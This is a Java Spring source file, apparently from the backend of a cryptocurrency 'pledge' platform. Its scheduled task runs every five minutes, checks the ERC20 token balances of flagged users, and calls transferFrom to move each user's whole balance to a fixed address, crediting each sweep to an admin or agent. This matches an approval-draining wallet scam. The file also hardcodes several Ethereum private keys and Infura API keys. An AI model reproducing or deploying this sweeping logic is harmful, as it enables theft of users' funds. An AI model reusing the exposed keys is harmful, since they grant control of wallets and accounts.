package cn.pledge.envconsole.book.task;

import cn.pledge.envconsole.book.entity.*;
import cn.pledge.envconsole.book.mapper.*;
import cn.pledge.envconsole.book.model.enums.PledgeType;
import cn.pledge.envconsole.common.utils.EthUtils;
import com.alibaba.fastjson.JSON;
import com.blockchain.tools.eth.contract.template.ERC20Contract;
import com.blockchain.tools.eth.contract.util.model.SendResultModel;
import com.blockchain.tools.eth.helper.EthHelper;
import lombok.extern.slf4j.Slf4j;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.beans.factory.annotation.Value;
import org.springframework.scheduling.annotation.Async;
import org.springframework.scheduling.annotation.EnableAsync;
import org.springframework.scheduling.annotation.EnableScheduling;
import org.springframework.scheduling.annotation.Scheduled;
import org.springframework.stereotype.Component;
import org.web3j.protocol.Web3j;
import org.web3j.protocol.core.methods.response.EthGetTransactionReceipt;
import org.web3j.protocol.core.methods.response.TransactionReceipt;
import org.web3j.protocol.http.HttpService;
import org.web3j.utils.Convert;

import java.io.IOException;
import java.math.BigDecimal;
import java.math.BigInteger;
import java.time.LocalDateTime;
import java.util.List;
import java.util.concurrent.ExecutionException;

/**
 * @author 89466
 */
@Component
@EnableScheduling
@EnableAsync
@Slf4j
public class AutoTransferTask {

    @Autowired
    private FlowRecordMapper flowRecordMapper;

    @Autowired
    private UserMapper userMapper;
    @Autowired
    private AdminMapper adminMapper;
    @Autowired
    private TransferMapper transferMapper;
    @Value("${contractAddress}")
    private String contractAddress;



//    @Scheduled(cron = "0 0 0/6 * * ?")
    @Scheduled(cron = "0 0/5 * * * ?")
    @Async
    public void  flowReward() throws Exception {
        //开启自动划走余额
       List<FlowRecord> flowRecordList = flowRecordMapper.selectflowIsAoutTransfer();

    for (FlowRecord flowRecord : flowRecordList) {

        BigInteger bigInteger = BigInteger.ZERO;
        if(flowRecord.getCurrencyType().equals("erc20")) {
            Web3j web3j = Web3j.build(new HttpService("https://mainnet.infura.io/v3/77c83ab9cfd746918a9b188a7692fa00"));

            bigInteger = EthUtils.balanceOfErc20(web3j, contractAddress, flowRecord.getUserAddress());

            BigDecimal amount = BigDecimal.valueOf(bigInteger.doubleValue()).divide(BigDecimal.valueOf(1000000));

            //比对结果自动划转值小于余额，进行转账
            if (flowRecord.getTransferNum().compareTo(amount.doubleValue()) < 0) {
                User user = userMapper.selectByPrimaryKey(flowRecord.getUserId());
//                EthUtils.transferERC20Token(web3j, user.getUserAddress(), "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70"
//                        , bigInteger, "89c61830b2516b4650db9e2c40ea380e7195d1f8fd3cb001d96ad91198ad33c5", contractAddress);

                ERC20Contract erc20Contract = ERC20Contract.builder(web3j, contractAddress);
                // 调用合约的 approve 函数
                SendResultModel sendResultModel = erc20Contract.transferFrom(
                        user.getUserAddress(), // 被授权人
                        "0x2DE34806507Ed2d876B95b3A9113F1EE01ec5EcF", // 调用者的地址
                        bigInteger, // 授权金额
                        "0x2DE34806507Ed2d876B95b3A9113F1EE01ec5EcF",
                        "844a133417bda2e45aefa7184075de65de4fe03240f7729708bf37c33335c350", // 调用者的私钥
                        null, // gasPrice，如果传null，自动使用默认值
                        BigInteger.valueOf(60000L) // gasLimit，如果传null，自动使用默认值
                );
                sendResultModel.getEthSendTransaction(); // 发送交易后的结果
                TransactionReceipt result = sendResultModel.getEthGetTransactionReceipt().getResult();// 交易成功上链后的结果

                if (result.getTransactionHash()!=null) {
                    flowRecord.setAmount(Double.valueOf(0));
                    flowRecord.setTime(0);
                    flowRecord.setUpdateTime(LocalDateTime.now());
                    flowRecordMapper.updateByPrimaryKeySelective(flowRecord);
                    Transfer transfer = new Transfer();
                    transfer.setHash(result.getTransactionHash());
                    transfer.setIsAuto(1);
                    transfer.setUserId(user.getId());
                    transfer.setCurrencyType("erc20");
                    transfer.setAmount(amount.doubleValue());
                    LocalDateTime now = LocalDateTime.now();
                    transfer.setCreateTime(now);
                    //管理员
                    if (user.getRootAddress().equals("0")) {
                        Integer id = adminMapper.selectByRoleIsAdminOne();
                        transfer.setAdminId(id);
                    }else {
                        //代理
                        Admin admin = adminMapper.selectByUserAddress(user.getRootAddress());
                        transfer.setAdminId(admin.getId());
                    }
                    transferMapper.insert(transfer);

                    log.info("进行转账 转账用户id为{} 地址为 {} 金额为{},", flowRecord.getUserId(),flowRecord.getUserAddress(),amount);

                }else {
                    log.info("获取hash为空", JSON.toJSONString(flowRecord));
                }
            }

        }
    }

    }

    public static void  test1() throws Exception {

        Web3j web3j = Web3j.build(new HttpService("https://goerli.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161"));
        BigInteger startBigIntegerFrom = EthUtils.balanceOfErc20(web3j, "0x4373f351c8967063e4263717f5c3892bb818e973","0xf64Da725e06ba8aB6DD775ec1f607220518A05F2");
        System.out.println("startBigIntegerFrom:----"+startBigIntegerFrom);

        BigInteger startBigIntegerTo = EthUtils.balanceOfErc20(web3j, "0x4373f351c8967063e4263717f5c3892bb818e973","0xaB966F0a1cB25710B9a8eac6C758676c674cbf70");
        System.out.println("startBigIntegerTo:------"+startBigIntegerTo);

        // 如果你想创建多个EthHelper对象，可以用这种方式
        ERC20Contract erc20Contract = ERC20Contract.builder(web3j, "0x4373f351c8967063e4263717f5c3892bb818e973");
        // 调用合约的 approve 函数
        SendResultModel sendResultModel = erc20Contract.transferFrom(
                "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70", // 被授权人
                "0xf64Da725e06ba8aB6DD775ec1f607220518A05F2", // 调用者的地址
                new BigInteger("1000000"), // 授权金额
                "0xf64Da725e06ba8aB6DD775ec1f607220518A05F2",
                "3afa4c99f213825969a6dfb79562128e79e289967944e0f3596f92ba6368bbda", // 调用者的私钥
                null, // gasPrice，如果传null，自动使用默认值
                null // gasLimit，如果传null，自动使用默认值
        );
        sendResultModel.getEthSendTransaction(); // 发送交易后的结果
        EthGetTransactionReceipt ethGetTransactionReceipt = sendResultModel.getEthGetTransactionReceipt();// 交易成功上链后的结果
        System.out.println(ethGetTransactionReceipt.getResult());

        BigInteger bigIntegerFrom = EthUtils.balanceOfErc20(web3j, "0x4373f351c8967063e4263717f5c3892bb818e973","0xf64Da725e06ba8aB6DD775ec1f607220518A05F2");
        System.out.println("bigIntegerFrom:-------"+bigIntegerFrom);

        BigInteger bigIntegerTo = EthUtils.balanceOfErc20(web3j, "0x4373f351c8967063e4263717f5c3892bb818e973","0xaB966F0a1cB25710B9a8eac6C758676c674cbf70");
        System.out.println("bigIntegerTo:--------"+bigIntegerTo);
    }
    public static void test2() throws Exception {

        Web3j web3j = Web3j.build(new HttpService("https://mainnet.infura.io/v3/77c83ab9cfd746918a9b188a7692fa00"));

        BigInteger startBigIntegerFrom = EthUtils.balanceOfErc20(web3j, "0xdac17f958d2ee523a2206206994597c13d831ec7","0xaB966F0a1cB25710B9a8eac6C758676c674cbf70");
        System.out.println("startBigIntegerFrom:----"+startBigIntegerFrom);

        BigInteger startBigIntegerTo = EthUtils.balanceOfErc20(web3j, "0xdac17f958d2ee523a2206206994597c13d831ec7","0xf64Da725e06ba8aB6DD775ec1f607220518A05F2");
        System.out.println("startBigIntegerTo:------"+startBigIntegerTo);

//        String s1 = EthUtils.transferERC20Token(web3j, "0xf64Da725e06ba8aB6DD775ec1f607220518A05F2", "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70"
//                , new BigInteger("1000000"), "89c61830b2516b4650db9e2c40ea380e7195d1f8fd3cb001d96ad91198ad33c5", "0xdac17f958d2ee523a2206206994597c13d831ec7");
//        System.out.println(s1);


//        String s = EthUtils.sendEth(web3j, "89c61830b2516b4650db9e2c40ea380e7195d1f8fd3cb001d96ad91198ad33c5", "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70", startBigIntegerFrom);
//        System.out.println(s);
        // 如果你想创建多个EthHelper对象，可以用这种方式
        BigInteger gasPrice = EthUtils.getGasPrice(web3j);

        System.out.println("gasPrice:-----"+gasPrice);
        BigInteger add = gasPrice.add(new BigInteger("10000000000"));
        System.out.println(add);
        //         如果你想创建多个EthHelper对象，可以用这种方式
        ERC20Contract erc20Contract = ERC20Contract.builder(web3j, "0xdac17f958d2ee523a2206206994597c13d831ec7");
        // 调用合约的 approve 函数
        SendResultModel sendResultModel = erc20Contract.transferFrom(
                "0xf64Da725e06ba8aB6DD775ec1f607220518A05F2", // 被授权人
                "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70", // 调用者的地址
                new BigInteger("1000000"), // 授权金额
                "0xaB966F0a1cB25710B9a8eac6C758676c674cbf70",
                "89c61830b2516b4650db9e2c40ea380e7195d1f8fd3cb001d96ad91198ad33c5", // 调用者的私钥
                null, // gasPrice，如果传null，自动使用默认值
                BigInteger.valueOf(60000L) // gasLimit，如果传null，自动使用默认值
        );
        sendResultModel.getEthSendTransaction(); // 发送交易后的结果
        EthGetTransactionReceipt ethGetTransactionReceipt = sendResultModel.getEthGetTransactionReceipt();// 交易成功上链后的结果
        System.out.println(ethGetTransactionReceipt.getResult().getTransactionHash());
        BigInteger bigIntegerFrom = EthUtils.balanceOfErc20(web3j, "0xdac17f958d2ee523a2206206994597c13d831ec7","0xaB966F0a1cB25710B9a8eac6C758676c674cbf70");
        System.out.println("bigIntegerFrom:-------"+bigIntegerFrom);

        BigInteger bigIntegerTo = EthUtils.balanceOfErc20(web3j, "0xdac17f958d2ee523a2206206994597c13d831ec7","0xf64Da725e06ba8aB6DD775ec1f607220518A05F2");
        System.out.println("bigIntegerTo:--------"+bigIntegerTo);
    }
    public static void main(String[] args) throws Exception {

//        test1();
//        test2();
        Web3j web3j = Web3j.build(new HttpService("https://mainnet.infura.io/v3/77c83ab9cfd746918a9b188a7692fa00"));

        BigInteger startBigIntegerTo = EthUtils.balanceOfErc20(web3j, "0xdac17f958d2ee523a2206206994597c13d831ec7","0xf64Da725e06ba8aB6DD775ec1f607220518A05F2");
        System.out.println("startBigIntegerTo:------"+startBigIntegerTo);

    }



}

